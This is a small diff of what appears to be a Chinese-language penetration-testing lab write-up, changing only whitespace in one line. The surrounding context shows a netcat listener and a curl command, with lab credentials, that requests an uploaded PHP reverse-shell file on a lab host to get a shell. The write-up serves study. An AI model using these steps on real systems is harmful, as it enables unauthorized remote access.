@@ -256,7 +256,7 @@ Kali 開啟監聽 port
 listening on [any] 8888 ...
 ```
 
-瀏覽上傳檔案: http://192.168.124.46:242/chw_revall.php\
+瀏覽上傳檔案: http://192.168.124.46:242/chw_revall.php \
 `curl -u 'offsec:elite' -X GET http://192.168.124.46:242/chw_revall.php`
 ### 6. 取得 Shell
 ```
